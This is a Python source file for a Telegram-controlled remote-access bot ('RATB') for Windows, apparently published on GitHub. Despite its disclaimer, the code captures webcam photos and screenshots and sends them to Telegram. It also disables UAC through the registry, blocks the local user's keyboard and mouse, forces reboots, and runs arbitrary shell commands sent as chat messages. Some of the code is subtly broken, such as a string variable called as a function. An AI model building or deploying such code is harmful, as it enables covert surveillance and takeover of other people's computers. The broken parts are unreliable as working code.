#!/usr/bin/env python3

"""
888b.    db    88888 888b. 
8  .8   dPYb     8   8wwwP 
8wwK'  dPwwYb    8   8   b 
8  Yb dP    Yb   8   888P' 

This is a simple bot for remote computer control via Telegram. It is not intended as a surveillance program.
To configure the bot, you must make your own config from configs/default.json.

https://github.com/superisuer/RATB
"""

# ---------------------------------
# SETTINGS
config_file = "configs/default.json" # JSON Config
# ---------------------------------

import cv2
import os
import logging
import json 
import platform
import psutil

from pyautogui import *
from telebot import *
from ctypes import *
from telebot import types
from datetime import datetime

try:
    f = open(config_file)
    data = json.loads(f.read()) # Reading from file
    f.close() # Closing file
except Exception as e:
    print(e)
    exit()

# ---------------------------------
# LOAD DATA
token = data["bot_token"]

write_logs = data["write_logs"]
file_logs = data["file_logs"]
mode_logs = data["mode_logs"]
format_logs = data["format_logs"]

users_ids = data["bot_users"]
# ---------------------------------

if write_logs:  
	logging.basicConfig(level=logging.INFO, filename=file_logs,filemode=mode_logs, format=format_logs)

# ---------------------------------
language = "en"
# ---------------------------------

def init_language(language):
    global success, need_to_reboot, camera, screenshot, keyboard, mouse
    if language == "en":
        success = "✅ Success!"
        need_to_reboot = "✅ Need to reboot."
        camera = "📸 Camera"
        screenshot = "🖥 Screenshot"
        keyboard = "⌨ Keyboard"
        mouse = "🖱 Mouse"
    elif language == "ru":
        success = "✅ Успешно!"
        need_to_reboot = "✅ Для применения нужна перезагрузка."
        camera = "📸 Камера"
        screenshot = "🖥 Скриншот"
        keyboard = "⌨ Клавиатура"
        mouse = "🖱 Мышь"

        

init_language("en")

rlgs = " "
sysmode = 0
inputblocked = False
alertmode = 0
writemode = 0
alert = None
bot=telebot.TeleBot(token)

@bot.message_handler(commands=['start'])
def start(message):
    if not message.from_user.id in users_ids:
        return None
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item1 = types.KeyboardButton(camera)
    item2 = types.KeyboardButton(screenshot)
    item3 = types.KeyboardButton(keyboard)
    item4 = types.KeyboardButton(mouse)
    item5 = types.KeyboardButton("📺 Information")
    item6 = types.KeyboardButton("🔧 Management")
    item7 = types.KeyboardButton("📜 Logs")
    item8 = types.KeyboardButton("⚙️ Settings")
    
    markup.add(item1, item2, item3, item4, item5, item6, item7, item8)
    bot.send_message(message.chat.id, "📁 Select option:", reply_markup=markup)
@bot.message_handler(func=lambda message: message.text == camera)
def camera_shot(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    if write_logs or write_logs == 1:
        current_datetime = datetime.now()
        print("CAMERA @" + str(message.from_user.username))
        write_data_time = str(current_datetime)
        logging.info("CAMERA @" + str(message.from_user.username))
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cv2.imwrite("camera1.png", frame)
    cap.release()
    
    photo = open('camera1.png', 'rb')
    bot.send_photo(message.chat.id, photo)
    photo.close()

@bot.message_handler(func=lambda message: message.text == screenshot)
def tg_screenshot(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    if write_logs or write_logs == 1:
        current_datetime = datetime.now()
        write_data_time = str(current_datetime)
        print(write_data_time + " SCREENSHOT @" + str(message.from_user.username))
        logging.info("SCREENSHOT @" + str(message.from_user.username))
    screenshot("screen.png")
    scre = open('screen.png', 'rb')
    bot.send_photo(message.chat.id, scre)

@bot.message_handler(func=lambda message: message.text == keyboard)
def open_keyboard_menu(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item31 = types.KeyboardButton("⌨ Enter")
    item32 = types.KeyboardButton("⌨ Backspace")
    item33 = types.KeyboardButton("⌨ Escape")
    item34 = types.KeyboardButton("⌨ Alt+Tab")
    item35 = types.KeyboardButton("⌨ Windows+E")
    backb = types.KeyboardButton("◀ Back")
    markup.add(item31, item32, item33, item34, item35,backb)
    bot.send_message(message.chat.id, "📁 Keyboard: Select option:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🔧 Management")
def open_management_menu(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item31 = types.KeyboardButton("🔧 Disable UAC (need to reboot)")
    item32 = types.KeyboardButton("🔧 Reboot")
    item33 = types.KeyboardButton("🔧 Shutdown")
    item34 = types.KeyboardButton("🔧 Add in autorun")
    item35 = types.KeyboardButton("🔧 Block input")
    backb = types.KeyboardButton("◀ Back")
    markup.add(item31, item32, item33, item34, item35,backb)
    bot.send_message(message.chat.id, "📁 Management: Select option:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🔧 Disable UAC (need to reboot)")
def disable_uac(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    os.system(r"REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
    bot.send_message(message.chat.id, need_to_reboot)

@bot.message_handler(func=lambda message: message.text == "🔧 Reboot")
def tg_reboot(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    os.system("shutdown /r /t 0")
    bot.send_message(message.chat.id, success)

@bot.message_handler(func=lambda message: message.text == "🔧 Shutdown")
def tg_shutdown(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    os.system("shutdown /s /t 0")
    bot.send_message(message.chat.id, success)

@bot.message_handler(func=lambda message: message.text == "🔧 Block input")
def block_input(message):
    if not message.from_user.id in users_ids:
        return None
    global inputblocked
    global rlgs
    if inputblocked:
        inputblocked = False
        ok = windll.user32.BlockInput(False) #disable block 
        bot.send_message(message.chat.id, success)
    else:
        inputblocked = True
        ok = windll.user32.BlockInput(True) #enable block
        bot.send_message(message.chat.id, success)

@bot.message_handler(func=lambda message: message.text == "🔧 Add in autorun")
def add_autorun(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    bot.send_message(message.chat.id, f"🔧 Soon. Now you can manually add it to autostart.")

@bot.message_handler(func=lambda message: message.text == "📺 Information")
def open_info_menu(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item31 = types.KeyboardButton("🖥 Screen Resolution")
    item32 = types.KeyboardButton("📀 Computer Information")
    item33 = types.KeyboardButton("📀 Boot Time")
    item34 = types.KeyboardButton("📀 CPU Information")
    backb = types.KeyboardButton("◀ Back")
    markup.add(item31, item32, item33, item34,backb)
    bot.send_message(message.chat.id, "📁 Information: Select option:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🖥 Screen Resolution")
def screen_res(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    bot.send_message(message.chat.id, f"🖥 {size()}")

@bot.message_handler(func=lambda message: message.text == "📀 Computer Information")
def computer_info(message):
    if not message.from_user.id in users_ids:
        return None
    uname = platform.uname()
    global rlgs
    bot.send_message(message.chat.id, f"📀 System: {uname.system}\n| Node Name: {uname.node}\n| Version: {uname.version}\n| Machine: {uname.machine}\n| Processor: {uname.processor}")

@bot.message_handler(func=lambda message: message.text == "📀 Boot Time")
def boot_time(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)
    bot.send_message(message.chat.id, f"📀 Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")

@bot.message_handler(func=lambda message: message.text == "📀 CPU Information")
def cpu_info(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    cpufreq = psutil.cpu_freq()
    bot.send_message(message.chat.id, f"📀 Physical cores: {psutil.cpu_count(logical=False)}\n| Max Frequency: {cpufreq.max:.2f}Mhz\n| CPU Usage: {psutil.cpu_percent()}%")

@bot.message_handler(func=lambda message: message.text == "⌨ Enter")
def keyboard_enter(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    press("enter")
    bot.send_message(message.chat.id, "✅ Success!")

@bot.message_handler(func=lambda message: message.text == "⌨ Backspace")
def keyboard_bs(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    press("backspace")
    bot.send_message(message.chat.id, "✅ Success!")

@bot.message_handler(func=lambda message: message.text == "⌨ Escape")
def keyboard_esc(message):
    if not message.from_user.id in users_ids:
        return None
    press("esc")
    bot.send_message(message.chat.id, "✅ Success!")

@bot.message_handler(func=lambda message: message.text == "⌨ Alt+Tab")
def keyboard_alttab(message):
    if not message.from_user.id in users_ids:
        return None
    hotkey('alt', 'tab')
    bot.send_message(message.chat.id, "✅ Success!")

@bot.message_handler(func=lambda message: message.text == "⌨ Windows+E")
def keyboard_win_e(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    hotkey('win', 'e')
    bot.send_message(message.chat.id, "✅ Success!")

@bot.message_handler(func=lambda message: message.text == mouse)
def open_mouse_menu(message):
    if not message.from_user.id in users_ids:
        return None
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item31 = types.KeyboardButton("🖱 Click")
    item32 = types.KeyboardButton("🖱 Double click") 
    item33 = types.KeyboardButton("🖱 Get position")
    item34 = types.KeyboardButton("🖱 Scroll Down")
    item35 = types.KeyboardButton("🖱 Scroll Up")
    backb = types.KeyboardButton("◀ Back")
    markup.add(item31,item32,item33,item34,item35,backb)
    bot.send_message(message.chat.id, "📁 Mouse: Select option:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🖱 Click")
def tg_click(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    click()

@bot.message_handler(func=lambda message: message.text == "🖱 Scroll Down")
def tg_click(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    scroll(-400)

@bot.message_handler(func=lambda message: message.text == "🖱 Scroll Up")
def tg_click(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    scroll(400)

@bot.message_handler(func=lambda message: message.text == "🖱 Get position")
def tg_getposition(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    bot.send_message(message.chat.id, "✅ {}".format(position()))

@bot.message_handler(func=lambda message: message.text == "🖱 Double click")
def tg_dclick(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    doubleClick()

@bot.message_handler(func=lambda message: message.text == "📜 Logs")
def open_logs(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    logf = open("logs.log", "r")
    for line in logf:
        try:
            bot.send_message(message.chat.id, logf.readlines())
            if logf.readlines() == "":
                bot.send_message(message.chat.id, "❌ No logs")
        except:
            bot.send_message(message.chat.id, "❌ Unknown error")

@bot.message_handler(func=lambda message: message.text == "⚙️ Settings")
def open_settings_menu(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item63 = types.KeyboardButton("🌐 Language")
    backb = types.KeyboardButton("◀ Back")
    markup.add(item63,backb)
    bot.send_message(message.chat.id, "📁 Settings: Select option:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🌐 Language")
def language_change(message):
    global rlgs
    if not message.from_user.id in users_ids:
        return None
    bot.send_message(message.chat.id, "🌐 Language will be soon...")
    
@bot.message_handler(func=lambda message: message.text == "◀ Back")
def tg_back(message):
    start(message)

@bot.message_handler(content_types='text')
def message_reply(message1):
    if not message1.from_user.id in users_ids:
        return None
    global rlgs
    if message1.text.startswith("Alert:"):
        alert(message1.text)
        bot.send_message(message1.chat.id, "📢 Success!")
    elif message1.text.startswith("Write:"):
        write(message1.text, interval=0.0001)
        bot.send_message(message1.chat.id, "⌨ Success!")
    elif message1.text.startswith("Command:"):
        a = os.popen(message1.text).readlines()
        bot.send_message(message1.chat.id, f"🛡 {a}")

bot.infinity_polling(none_stop=True)